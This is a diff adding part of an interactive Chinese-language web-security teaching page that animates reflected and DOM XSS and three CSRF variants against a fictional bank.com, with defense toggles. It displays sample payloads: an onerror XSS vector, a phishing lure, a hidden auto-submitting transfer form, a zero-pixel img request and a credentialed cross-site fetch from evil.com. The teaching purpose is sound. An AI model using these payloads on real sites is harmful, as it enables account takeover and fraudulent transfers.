+          { id: 'victim', label: '🟢 受害者浏览器', url: 'https://bank.com/search?q=...', color: 'var(--accent-green)' },
+        ],
+        steps: [
+          {
+            narration: '攻击者构造一个包含恶意脚本的搜索链接，通过钓鱼邮件或消息发送给受害者。',
+            render(bs) {
+              bs.attacker = `<div class="web-page"><h4>🎣 构造恶意 URL</h4>
+            <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:10px;font-size:11px;font-family:monospace;word-break:break-all;color:var(--accent-red)">
+            https://bank.com/search?q=${encodeURIComponent(payload)}</div>
+            <div style="margin-top:10px;padding:8px;background:var(--bg-card);border:1px solid var(--border);border-radius:6px;font-size:12px">
+            📧 钓鱼邮件：<br><span style="color:var(--text-secondary)">"您有一笔退款待确认，点击查看详情"</span></div></div>`;
+            }
+          },
+          {
+            narration: '受害者点击了链接，浏览器向 bank.com 发送带有恶意参数的请求。',
+            render(bs) {
+              bs.victim = `<div class="web-page"><h4>🖱️ 点击了链接</h4>
+            <div class="net-log"><h5>📤 发送请求</h5>
+            <div class="req malicious"><span class="method get">GET</span> /search?q=${esc(payload).substring(0, 30)}...</div></div></div>`;
+            }
+          },
+          {
+            narration: escapeOn
+              ? '服务端对 URL 参数进行了<span class="safe">HTML 转义</span>后再嵌入页面，脚本标签变成纯文本。'
+              : '服务端<span class="highlight">直接将 URL 参数拼接到 HTML 中</span>，恶意脚本被"反射"回浏览器。',
+            render(bs) {
+              bs.server = `<div class="attacker-log"><h4>⚙️ 服务端处理</h4>
+            <div class="loot">${escapeOn
+                  ? `渲染模板（安全）：<br><code>搜索结果: \${escapeHtml(req.query.q)}</code><br><br>输出: 搜索结果: ${esc(payload)}`
+                  : `渲染模板（危险）：<br><code>搜索结果: \${req.query.q}</code><br><br>输出: 搜索结果: ${esc(payload)}`}</div></div>`;
+            }
+          },
+          {
+            narration: blocked
+              ? '<span class="safe">攻击被拦截！</span>恶意脚本未能执行。反射型 XSS 的防御关键是对所有用户输入做输出编码。'
+              : '浏览器解析返回的 HTML 时<span class="highlight">执行了注入的脚本</span>，弹出 Cookie 内容。与存储型不同，反射型 XSS 只影响点击链接的用户。',
+            render(bs) {
+              bs.victim = blocked
+                ? `<div class="web-page"><h4>🔍 搜索页面</h4>
+              <div style="padding:12px;background:var(--bg-card);border-radius:6px;font-size:13px">搜索结果: ${esc(payload)}</div>
+              <div style="color:var(--accent-green);padding:8px;font-size:12px;margin-top:8px">✅ 恶意脚本被转义为纯文本显示</div></div>`
+                : `<div class="web-page"><h4>🔍 搜索页面</h4>
+              <div class="comment-box injected"><div class="cb-text">⚡ alert(document.cookie) 执行！<br><br>弹窗内容: session=abc123xyz</div></div>
+              <div style="color:var(--accent-red);padding:8px;font-size:12px">⚠️ 恶意脚本可替换为更隐蔽的 Cookie 窃取代码</div></div>`;
+            }
+          },
+        ]
+      };
+    }
+
+    function buildDomXSS(defenses) {
+      const escapeOn = defenses.find(d => d.id === 'escape')?.on;
+      const blocked = escapeOn;
+      return {
+        browsers: [
+          { id: 'attacker', label: '🔴 攻击者', url: '构造恶意 URL', color: 'var(--accent-red)' },
+          { id: 'server', label: '⚙️ 前端代码分析', url: 'bank.com 的 JavaScript', color: 'var(--text-secondary)' },
+          { id: 'victim', label: '🟢 受害者浏览器', url: 'https://bank.com/page#...', color: 'var(--accent-green)' },
+        ],
+        steps: [
+          {
+            narration: '攻击者发现页面 JS 会读取 URL hash 并直接写入 DOM，于是构造恶意 URL。注意 <code>#</code> 后的内容不会发送到服务器。',
+            render(bs) {
+              bs.attacker = `<div class="web-page"><h4>🔍 发现漏洞代码</h4>
+            <div style="background:var(--bg-card);border:1px solid rgba(var(--accent-red-rgb,248,81,73),0.25);border-radius:6px;padding:10px;font-size:11px;font-family:monospace;color:var(--accent-red)">
+            // bank.com 的 JS 代码:<br>
+            var name = location.hash.slice(1);<br>
+            document.getElementById('welcome')<br>
+            &nbsp;&nbsp;.innerHTML = 'Hello, ' + name; // 危险!</div>
+            <div style="margin-top:8px;background:var(--bg-card);border:1px solid var(--border);border-radius:6px;padding:10px;font-size:11px;font-family:monospace;word-break:break-all;color:var(--accent-red)">
+            构造 URL:<br>bank.com/page#&lt;img src=x onerror=alert(1)&gt;</div></div>`;
+            }
+          },
+          {
+            narration: '与反射型不同，DOM 型 XSS 的恶意载荷<span class="highlight">不经过服务器</span>，完全在浏览器端通过 JavaScript 处理。这意味着服务端日志中看不到攻击痕迹。',
+            render(bs) {
+              bs.server = `<div class="attacker-log"><h4>⚙️ 对比三种 XSS 数据流</h4>
+            <div style="font-size:12px;line-height:2">
+            <div><span style="color:var(--accent-red)">存储型：</span>攻击者 → <u>服务器(存储)</u> → 受害者</div>
+            <div><span style="color:var(--accent-orange)">反射型：</span>攻击者 → <u>服务器(反射)</u> → 受害者</div>
+            <div><span style="color:var(--accent-purple)">DOM 型：</span>攻击者 → 受害者（不经过服务器）</div>
+            </div>
+            <div style="margin-top:12px;color:var(--text-secondary);font-size:11px">因此服务端 WAF 无法检测 DOM 型 XSS</div></div>`;
+            }
+          },
+          {
+            narration: blocked
+              ? '前端代码使用 <code>textContent</code> 而非 <code>innerHTML</code>，<span class="safe">恶意标签被当作纯文本处理</span>。'
+              : '受害者打开链接，前端 JS 读取 hash 并通过 <code>innerHTML</code> <span class="highlight">直接将恶意内容写入 DOM</span>。',
+            render(bs) {
+              bs.victim = blocked
+                ? `<div class="web-page"><h4>bank.com 页面</h4>
+              <div style="padding:12px;background:var(--bg-card);border-radius:6px;font-size:13px">Hello, ${esc('<img src=x onerror=alert(1)>')}</div>
+              <div style="color:var(--accent-green);padding:8px;font-size:12px;margin-top:8px">✅ 使用 textContent / 模板引擎自动转义<br>恶意内容显示为纯文本</div></div>`
+                : `<div class="web-page"><h4>bank.com 页面</h4>
+              <div class="comment-box injected"><div class="cb-text">Hello, <br>⚡ onerror 事件触发! alert(1) 执行</div></div>
+              <div style="color:var(--accent-red);padding:8px;font-size:12px;margin-top:8px">⚠️ 实际攻击中 alert 会替换为更危险的操作</div></div>`;
+            }
+          },
+        ]
+      };
+    }
+
+    function buildCSRFForm(defenses) {
+      const tokenOn = defenses.find(d => d.id === 'token')?.on;
+      const sameSiteOn = defenses.find(d => d.id === 'samesite')?.on;
+      const blocked = tokenOn || sameSiteOn;
+      return {
+        browsers: [
+          { id: 'attacker', label: '🔴 恶意网站 (evil.com)', url: 'https://evil.com/trick.html', color: 'var(--accent-red)' },
+          { id: 'server', label: '⚙️ 目标服务端 (bank.com)', url: 'bank.com/api/transfer', color: 'var(--text-secondary)' },
+          { id: 'victim', label: '🟢 受害者浏览器', url: '已登录 bank.com', color: 'var(--accent-green)' },
+        ],
+        steps: [
+          {
+            narration: '前提：受害者已登录 bank.com，浏览器中存有有效的 Session Cookie。',
+            render(bs) {
+              bs.victim = `<div class="web-page"><h4>🏦 bank.com — 已登录</h4>
+            <div style="padding:8px;background:rgba(54,217,134,0.1);border-radius:6px;color:var(--accent-green);font-size:12px;margin-bottom:10px">✓ 已登录用户: Alice</div>
+            <div class="cookie-jar"><h5>🍪 Cookie（自动附带到 bank.com 的所有请求）</h5>
+            <div class="cookie">session=abc123xyz; domain=bank.com${sameSiteOn ? '; <span style="color:var(--accent-green)">SameSite=Lax</span>' : ''}</div></div></div>`;
+            }
+          },
+          {
+            narration: '攻击者在 evil.com 构造一个隐藏表单，目标指向 bank.com 的转账接口，页面加载时<span class="highlight">自动提交</span>。',
+            render(bs) {
+              bs.attacker = `<div class="web-page"><h4>🎁 evil.com — "免费抽奖"页面</h4>
+            <div style="padding:12px;background:var(--bg-card);border:1px solid rgba(var(--accent-red-rgb,248,81,73),0.25);border-radius:6px;font-size:11px;font-family:monospace;color:var(--accent-red)">
+            &lt;!-- 隐藏的自动提交表单 --&gt;<br>
+            &lt;form action="https://bank.com/api/transfer"<br>
+            &nbsp;&nbsp;method="POST" id="csrf-form"&gt;<br>
+            &nbsp;&nbsp;&lt;input type="hidden" name="to" value="attacker"&gt;<br>
+            &nbsp;&nbsp;&lt;input type="hidden" name="amount" value="10000"&gt;<br>
+            &lt;/form&gt;<br>
+            &lt;script&gt;csrf-form.submit()&lt;/script&gt;</div>
+            <div style="color:var(--text-secondary);font-size:11px;margin-top:6px">用户看到的是"恭喜获奖"页面，完全不知道表单已提交</div></div>`;
+            }
+          },
+          {
+            narration: sameSiteOn
+              ? '浏览器检测到这是<span class="safe">跨站请求</span>，由于 Cookie 设置了 <code>SameSite=Lax</code>，POST 请求不会携带 Cookie。'
+              : '受害者浏览 evil.com 时，隐藏表单自动提交。<span class="highlight">浏览器自动附带了 bank.com 的 Cookie</span>——这是 CSRF 的核心！',
+            render(bs) {
+              bs.victim = `<div class="web-page"><h4>🟢 受害者浏览器</h4>
+            <div class="net-log"><h5>📤 自动发送的请求</h5>
+            <div class="req ${sameSiteOn ? 'blocked' : 'malicious'}"><span class="method post">POST</span> https://bank.com/api/transfer<br>
+            Cookie: ${sameSiteOn ? '<span style="color:var(--accent-green)">[未携带 — SameSite 阻止]</span>' : 'session=abc123xyz ← 自动附带!'}<br>
+            Body: to=attacker&amount=10000${tokenOn ? '&_csrf=[无 Token]' : ''}</div></div>
+            ${sameSiteOn ? '<div style="color:var(--accent-green);padding:8px;font-size:12px">✅ SameSite Cookie 阻止了跨站 Cookie 发送</div>' : ''}
+            </div>`;
+            }
+          },
+          {
+            narration: blocked
+              ? (tokenOn && !sameSiteOn ? '服务端验证 CSRF Token，发现请求中<span class="safe">缺少有效 Token</span>，拒绝执行。' : '攻击<span class="safe">被防御措施拦截</span>，转账未执行。')
+              : '服务端收到请求，Cookie 有效，<span class="highlight">转账成功执行</span>。服务端无法区分这是用户自己的操作还是 CSRF 攻击。',
+            render(bs) {
+              bs.server = blocked
+                ? `<div class="attacker-log"><h4>⚙️ bank.com 服务端</h4>
+              <div style="padding:12px;font-size:13px">
+              📥 收到 POST /api/transfer<br><br>
+              ${!sameSiteOn && tokenOn ? '<span style="color:var(--accent-green)">🛡️ CSRF Token 验证失败<br>请求中无有效 _csrf Token</span>' : sameSiteOn ? '<span style="color:var(--accent-green)">🛡️ 请求未携带 Cookie，视为未认证请求</span>' : ''}
+              <br><br><span style="color:var(--accent-green);font-weight:700">HTTP 403 Forbidden</span><br>转账未执行</div></div>`
+                : `<div class="attacker-log"><h4>⚙️ bank.com 服务端</h4>
+              <div class="loot captured">📥 POST /api/transfer<br>Cookie: session=abc123xyz ✓ 验证通过<br>Body: to=attacker, amount=10000<br><br>💸 转账执行成功! Alice → attacker: ¥10,000</div>
+              <div style="color:var(--accent-red);font-size:12px;margin-top:8px">⚠️ 服务端无法区分合法请求和 CSRF 攻击</div></div>`;
+            }
+          },
+        ]
+      };
+    }
+
+    function buildCSRFImg(defenses) {
+      const tokenOn = defenses.find(d => d.id === 'token')?.on;
+      const sameSiteOn = defenses.find(d => d.id === 'samesite')?.on;
+      const refererOn = defenses.find(d => d.id === 'referer')?.on;
+      const blocked = sameSiteOn || refererOn;
+      return {
+        browsers: [
+          { id: 'attacker', label: '🔴 恶意网站 / 论坛帖子', url: '嵌入恶意 img 标签', color: 'var(--accent-red)' },
+          { id: 'server', label: '⚙️ 目标服务端 (bank.com)', url: 'bank.com API', color: 'var(--text-secondary)' },
+          { id: 'victim', label: '🟢 受害者浏览器', url: '浏览页面', color: 'var(--accent-green)' },
+        ],
+        steps: [
+          {
+            narration: '攻击者在论坛帖子或邮件中嵌入一个<span class="highlight">看不见的图片标签</span>，src 指向目标站点的敏感 GET 接口。',
+            render(bs) {
+              bs.attacker = `<div class="web-page"><h4>🎭 恶意内容</h4>
+            <div style="background:var(--bg-card);border:1px solid rgba(var(--accent-red-rgb,248,81,73),0.25);border-radius:6px;padding:10px;font-size:11px;font-family:monospace;color:var(--accent-red)">
+            &lt;!-- 隐形图片，0x0 像素 --&gt;<br>
+            &lt;img src="https://bank.com/api/transfer<br>
+            &nbsp;&nbsp;?to=attacker&amount=1000"<br>
+            &nbsp;&nbsp;width="0" height="0"&gt;</div>
+            <div style="color:var(--text-secondary);font-size:11px;margin-top:6px">利用了浏览器加载图片时自动发 GET 请求的特性<br>⚠️ 敏感操作不应使用 GET 方法！</div></div>`;
+            }
+          },
+          {
+            narration: '受害者只是浏览了包含该图片的页面，浏览器自动加载图片 → <span class="highlight">自动发送 GET 请求并附带 Cookie</span>。',
+            render(bs) {
+              bs.victim = `<div class="web-page"><h4>🟢 受害者浏览器</h4>
+            <div class="net-log"><h5>📤 浏览器自动发起（加载图片）</h5>
+            <div class="req ${blocked ? 'blocked' : 'malicious'}"><span class="method get">GET</span> bank.com/api/transfer?to=attacker&amount=1000<br>
+            Cookie: ${sameSiteOn ? '[SameSite 阻止]' : 'session=abc123xyz'}<br>
+            Referer: ${refererOn ? '<span style="color:var(--accent-green)">evil.com ← 来源不匹配</span>' : 'evil.com'}</div></div></div>`;
+            }
+          },
+          {
+            narration: blocked
+              ? '攻击<span class="safe">被拦截</span>。' + (sameSiteOn ? 'SameSite Cookie 阻止了跨站 Cookie。' : 'Referer 校验发现请求来自非法域名。')
+              : '服务端处理了 GET 请求，<span class="highlight">转账被执行</span>。这也说明了为什么<span class="highlight">敏感操作必须使用 POST</span>。',
+            render(bs) {
+              bs.server = blocked
+                ? `<div class="attacker-log"><h4>⚙️ bank.com</h4>
+              <div style="padding:12px;color:var(--accent-green);font-size:13px">🛡️ 请求被拒绝<br>${sameSiteOn ? 'SameSite Cookie 未被发送' : refererOn ? 'Referer: evil.com — 不在白名单中' : ''}<br><br>HTTP 403 Forbidden</div></div>`
+                : `<div class="attacker-log"><h4>⚙️ bank.com</h4>
+              <div class="loot captured">GET /api/transfer?to=attacker&amount=1000<br>Cookie: session=abc123xyz ✓<br><br>💸 转账执行! ¥1,000 → attacker</div>
+              <div style="color:var(--accent-orange);padding:8px;font-size:12px">💡 防御要点：敏感操作应使用 POST<br>+ CSRF Token + SameSite Cookie</div></div>`;
+            }
+          },
+        ]
+      };
+    }
+
+    function buildCSRFAjax(defenses) {
+      const tokenOn = defenses.find(d => d.id === 'token')?.on;
+      const sameSiteOn = defenses.find(d => d.id === 'samesite')?.on;
+      return {
+        browsers: [
+          { id: 'attacker', label: '🔴 evil.com', url: 'https://evil.com', color: 'var(--accent-red)' },
+          { id: 'server', label: '⚙️ 浏览器同源策略 + 服务端', url: 'CORS 机制', color: 'var(--text-secondary)' },
+          { id: 'victim', label: '🟢 受害者浏览器', url: '访问 evil.com', color: 'var(--accent-green)' },
+        ],
+        steps: [
+          {
+            narration: 'evil.com 的 JS 尝试用 <code>fetch()</code> 向 bank.com 发送跨域 POST 请求。',
+            render(bs) {
+              bs.attacker = `<div class="web-page"><h4>🔴 evil.com 的 JavaScript</h4>
+            <div style="background:var(--bg-card);border:1px solid rgba(var(--accent-red-rgb,248,81,73),0.25);border-radius:6px;padding:10px;font-size:11px;font-family:monospace;color:var(--accent-red)">
+            fetch('https://bank.com/api/transfer', {<br>
+            &nbsp;&nbsp;method: 'POST',<br>
+            &nbsp;&nbsp;headers: { 'Content-Type': 'application/json' },<br>
+            &nbsp;&nbsp;credentials: 'include', // 携带 Cookie<br>
+            &nbsp;&nbsp;body: JSON.stringify({<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;to: 'attacker', amount: 10000<br>
+            &nbsp;&nbsp;})<br>
+            });</div></div>`;
+            }
+          },
+          {
+            narration: '由于请求头 <code>Content-Type: application/json</code> 不是简单请求，浏览器先发送<span class="highlight">预检请求 (OPTIONS)</span> 询问服务器是否允许跨域。',
+            render(bs) {
+              bs.victim = `<div class="web-page"><h4>🟢 浏览器行为</h4>
+            <div class="net-log"><h5>📤 预检请求 (Preflight)</h5>
+            <div class="req"><span class="method" style="color:var(--accent-purple);font-weight:700">OPTIONS</span> https://bank.com/api/transfer<br>
+            Origin: https://evil.com<br>
+            Access-Control-Request-Method: POST<br>
+            Access-Control-Request-Headers: content-type</div></div>
+            <div style="color:var(--text-secondary);padding:8px;font-size:11px">浏览器自动发送 OPTIONS 预检<br>此时不携带 Cookie</div></div>`;
+            }
+          },
+          {
+            narration: 'bank.com 的 CORS 配置不允许 evil.com 跨域访问，<span class="safe">浏览器阻止了实际请求</span>。这是浏览器同源策略的保护。',
+            render(bs) {
+              bs.server = `<div class="attacker-log"><h4>⚙️ CORS 机制</h4>
+            <div style="padding:12px;font-size:12px;line-height:2">
+            <div style="color:var(--accent-green)">服务端响应：</div>
+            <div style="font-family:monospace;font-size:11px;color:var(--text-secondary)">
+            Access-Control-Allow-Origin: https://bank.com<br>
+            ← 不包含 evil.com!</div>
+            <br>
+            <div style="color:var(--accent-green)">🛡️ 浏览器判定：跨域请求被拒绝</div>
+            <div style="color:var(--text-secondary);font-size:11px;margin-top:8px">
+            但注意：<span style="color:var(--accent-orange)">简单请求（form 表单 POST）不需要预检！</span><br>
+            所以 CORS 不能完全替代 CSRF Token</div></div></div>`;
+              bs.victim = `<div class="web-page"><h4>🟢 浏览器控制台</h4>
+            <div style="background:rgba(var(--accent-red-rgb,248,81,73),0.06);border:1px solid rgba(var(--accent-red-rgb,248,81,73),0.25);border-radius:6px;padding:10px;font-size:11px;font-family:monospace;color:var(--accent-red)">
+            ❌ Access to fetch at 'https://bank.com/api/transfer'<br>
+            from origin 'https://evil.com' has been blocked<br>
+            by CORS policy: No 'Access-Control-Allow-Origin'<br>
+            header is present on the requested resource.</div>
+            <div style="color:var(--accent-green);padding:8px;font-size:12px;margin-top:8px">✅ 同源策略阻止了 AJAX CSRF<br>但表单提交不受此限制！</div></div>`;
+            }
+          },
+        ]
+      };
+    }
+
+    // ======================== STATE ========================
+    const state = {
+      attack: 'xss',
+      variant: 'stored',
+      speed: 1,
+      playing: false,
+      step: -1,
+      defenses: [],
+      browserStates: {},
+    };
+
+    function initDefenses() {
+      const atk = ATTACKS.find(a => a.id === state.attack);
+      state.defenses = atk.defenses.map(d => ({ ...d, on: false }));
+    }
+
+    // ======================== RENDER ========================
+    function esc(s) { return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;'); }
+
+    function renderAttackCards() {
+      document.getElementById('attackCards').innerHTML = ATTACKS.map(a => `
+    <div class="attack-card ${state.attack === a.id ? 'active' : ''}" style="--c:${a.color}" onclick="selectAttack('${a.id}')">
+      <div class="ac-name" style="color:${a.color}">${a.name}</div>
+      <div class="ac-desc">${a.desc}</div>
+    </div>`).join('');
+    }
+
+    function renderVariantCards() {
+      const atk = ATTACKS.find(a => a.id === state.attack);
+      document.getElementById('variantCards').innerHTML = atk.variants.map(v => `
+    <div class="variant-card ${state.variant === v.id ? 'active' : ''}" onclick="selectVariant('${v.id}')">
+      <div class="vc-name">${v.name}</div>
+      <div class="vc-desc">${v.desc}</div>
+    </div>`).join('');
+    }
+
+    function renderDefenseToggles() {
+      document.getElementById('defenseToggles').innerHTML = state.defenses.map((d, i) => `
+    <div class="defense-toggle ${d.on ? 'on' : ''}" onclick="toggleDefense(${i})" style="margin-bottom:4px">
+      <div class="dt-switch"></div>
+      <div><div style="font-weight:600">${d.name}</div><div style="font-size:10px;color:var(--text-secondary)">${d.desc}</div></div>
+    </div>`).join('');
+    }
+
+    function renderHeader() {
+      const atk = ATTACKS.find(a => a.id === state.attack);
+      const v = atk.variants.find(v => v.id === state.variant);
+      const anyDef = state.defenses.some(d => d.on);
+      document.getElementById('headerTitle').textContent = `${v.name}`;
+      const tag = document.getElementById('headerTag');
+      tag.textContent = `${v.severity === 'critical' ? '🔴 Critical' : v.severity === 'high' ? '🟠 High' : '🟡 Medium'} · ${v.owasp}`;
+      tag.style.background = v.severity === 'critical' ? 'rgba(var(--accent-red-rgb,248,81,73),0.19)' : v.severity === 'high' ? 'rgba(var(--accent-orange-rgb,255,159,67),0.19)' : 'rgba(var(--accent-orange-rgb,255,159,67),0.13)';
+      tag.style.color = v.severity === 'critical' ? 'var(--accent-red)' : 'var(--accent-orange)';
+      const dTag = document.getElementById('defenseTag');
+      dTag.style.display = anyDef ? 'inline' : 'none';
+      dTag.textContent = '🛡️ 防御: ' + state.defenses.filter(d => d.on).map(d => d.name).join(', ');
+      dTag.style.background = 'rgba(54,217,134,0.13)'; dTag.style.color = 'var(--accent-green)';
+    }
+
+    function renderBrowsers() {
+      const scenario = buildScenario(state.attack, state.variant, state.defenses);
+      const area = document.getElementById('simArea');
+      area.innerHTML = scenario.browsers.map(b => `
+    <div class="browser" id="browser-${b.id}">
+      <div class="browser-bar">
+        <div class="browser-dots"><span style="background:var(--accent-red)"></span><span style="background:var(--accent-orange)"></span><span style="background:var(--accent-green)"></span></div>
+        <div class="browser-url">${esc(b.url)}</div>
+        <span class="browser-label" style="background:${b.color}20;color:${b.color}">${b.label}</span>
+      </div>
+      <div class="browser-body" id="body-${b.id}">
+        <div class="web-page" style="color:var(--text-muted);text-align:center;padding-top:40px">等待演示开始...</div>
+      </div>
+    </div>`).join('');
+    }
+
+    function renderStep() {
+      const scenario = buildScenario(state.attack, state.variant, state.defenses);
+      if (state.step < 0 || state.step >= scenario.steps.length) return;
+
+      const step = scenario.steps[state.step];
+      const bs = state.browserStates;
+      step.render(bs);
+
+      scenario.browsers.forEach(b => {
+        const el = document.getElementById('body-' + b.id);
+        if (el && bs[b.id]) el.innerHTML = bs[b.id];
+      });
+
+      const narEl = document.getElementById('narration');
+      narEl.innerHTML = `<span class="step-num">${state.step + 1}/${scenario.steps.length}</span><div class="step-text">${step.narration}</div>`;
+    }
+
+    function renderAll() {
+      renderAttackCards();
+      renderVariantCards();
+      renderDefenseToggles();
+      renderHeader();
+      renderBrowsers();
+      updatePrompt();
+    }
+
+    // ======================== INTERACTIONS ========================
+    function selectAttack(id) {
+      if (state.playing) stopPlay();
+      state.attack = id;
+      const atk = ATTACKS.find(a => a.id === id);
+      state.variant = atk.variants[0].id;
+      initDefenses();
+      state.step = -1;
+      state.browserStates = {};
+      renderAll();
+    }
+
+    function selectVariant(id) {
+      if (state.playing) stopPlay();
+      state.variant = id;
+      state.step = -1;
+      state.browserStates = {};
+      renderAll();
+    }
+
+    function toggleDefense(i) {
+      state.defenses[i].on = !state.defenses[i].on;
+      if (state.playing) stopPlay();
+      state.step = -1;
+      state.browserStates = {};
+      renderDefenseToggles();
+      renderHeader();
+      renderBrowsers();
+      updatePrompt();
+    }
+
+    let playTimer = null;
+    function togglePlay() {
+      if (state.playing) { stopPlay(); return; }
+      state.playing = true;
+      state.step = -1;
+      state.browserStates = {};
+      renderBrowsers();
+      document.getElementById('playBtn').textContent = '■ 停止';
+      document.getElementById('playBtn').className = 'play-btn stop';
+      advanceStep();
+    }
+
+    function stopPlay() {
+      state.playing = false;
+      clearTimeout(playTimer);
+      document.getElementById('playBtn').textContent = '⚡ 发起攻击';
+      document.getElementById('playBtn').className = 'play-btn go';
+    }
+
+    function advanceStep() {
+      if (!state.playing) return;
+      const scenario = buildScenario(state.attack, state.variant, state.defenses);
+      state.step++;
+      if (state.step >= scenario.steps.length) {
+        stopPlay();
+        state.step = scenario.steps.length - 1;
+        return;
+      }
+      renderStep();
+      updatePrompt();
+      const delay = (1600 + scenario.steps[state.step].narration.length * 3) / state.speed;
+      playTimer = setTimeout(advanceStep, delay);
+    }
+
+    function resetSim() {
+      stopPlay();
+      state.step = -1;
+      state.browserStates = {};
+      renderBrowsers();
+      document.getElementById('narration').innerHTML = '<span class="step-num">0</span><div class="step-text">选择攻击类型和变体，然后点击「发起攻击」观看演示。</div>';
+      updatePrompt();
+    }
+
+    // ======================== PROMPT ========================
+    function updatePrompt() {
+      const atk = ATTACKS.find(a => a.id === state.attack);
+      const v = atk.variants.find(v => v.id === state.variant);
+      const activeDef = state.defenses.filter(d => d.on);
+
+      const parts = [`我正在学习 Web 安全中的 ${atk.name}攻击。`];
+      parts.push(`\n\n当前演示的是「${v.name}」：${v.desc}。`);
+
+      if (activeDef.length > 0) {
+        parts.push(`\n\n已开启的防御措施：${activeDef.map(d => `${d.name}（${d.desc}）`).join('；')}。`);
+        parts.push(`\n请详细解释：`);
+        parts.push(`1. 这些防御措施各自的实现原理和在哪一层生效（浏览器/服务端/网络层）。`);
+        parts.push(`2. 每种措施能防住什么、不能防住什么，它们之间如何互补。`);
+        parts.push(`3. 在实际项目中的最佳实践配置（给出具体代码示例）。`);
+      } else {
+        parts.push(`\n\n请详细解释：`);
+        parts.push(`1. 这种攻击的完整原理和攻击链（从攻击者构造载荷到最终利用）。`);
+        parts.push(`2. 与其他 ${state.attack === 'xss' ? 'XSS 变体（存储型/反射型/DOM型）' : 'CSRF 变体（表单/IMG/AJAX）'}的区别。`);
+        parts.push(`3. 推荐的防御方案组合，给出 ${state.attack === 'xss' ? 'Node.js/Java' : 'Spring Boot/Express'} 的具体防御代码。`);
+        parts.push(`4. 真实世界中这类攻击的经典案例。`);
+      }
+
+      if (state.attack === 'xss') {
+        parts.push(`\n\n额外问题：XSS 和 CSRF 之间有什么关联？XSS 是否可以绕过 CSRF Token 防御？`);
+      } else {
+        parts.push(`\n\n额外问题：为什么说 "CORS 不能替代 CSRF Token"？SameSite Cookie 是否足以完全防御 CSRF？`);
+      }
+
+      document.getElementById('promptText').textContent = parts.join('');
+    }
+
+    function copyPrompt() {
+      const text = document.getElementById('promptText').textContent;
+      navigator.clipboard.writeText(text).then(() => {
+        const btn = document.getElementById('copyBtn');
+        btn.textContent = '已复制!'; btn.classList.add('copied');
+        setTimeout(() => { btn.textContent = '复制'; btn.classList.remove('copied'); }, 1500);
+      });
+    }
+
+    // ======================== INIT ========================
+    initDefenses();
+    renderAll();
+  </script>
+  <script src="shared/nav.js"></script>
+  <script src="shared/theme.js"></script>
+  <script src="shared/analytics.js"></script>
+</body>
+
+</html>
